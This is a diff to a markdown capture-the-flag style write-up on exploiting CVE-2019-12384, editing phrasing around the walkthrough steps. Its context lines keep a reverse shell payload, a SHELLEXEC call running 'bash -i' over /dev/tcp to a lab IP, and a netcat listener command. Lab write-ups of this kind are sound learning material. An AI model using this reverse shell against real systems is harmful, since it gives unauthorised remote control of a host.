@@ -48,7 +48,7 @@ priority: 2
 ##### Hackers logic if there is a CVE, Find its Exploit.
 
 * I found this [Exploit](https://github.com/jas502n/CVE-2019-12384), But for some reason it didn't work with me.
-* The i found [This](https://www.programmersought.com/article/77146841082/), I will use the RCE part with reverse shell.
+* Then i found [This one](https://www.programmersought.com/article/77146841082/), I will use the RCE part with reverse shell.
 
 > **In simple steps:**
 1. Add inject.sql file to your machine.
@@ -71,7 +71,7 @@ CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.16.11/1234 0>&1 &')
 
 ![](https://i.ibb.co/synM0x0/image.png)
 
-**Netcat as our listner ```ruby nc -nlvp 1234 ```**
+**Netcat as our listner ```yahia@Y4h1a:~$ nc -nlvp 1234 ```**
 ![]()
 ![]()
 ![]()
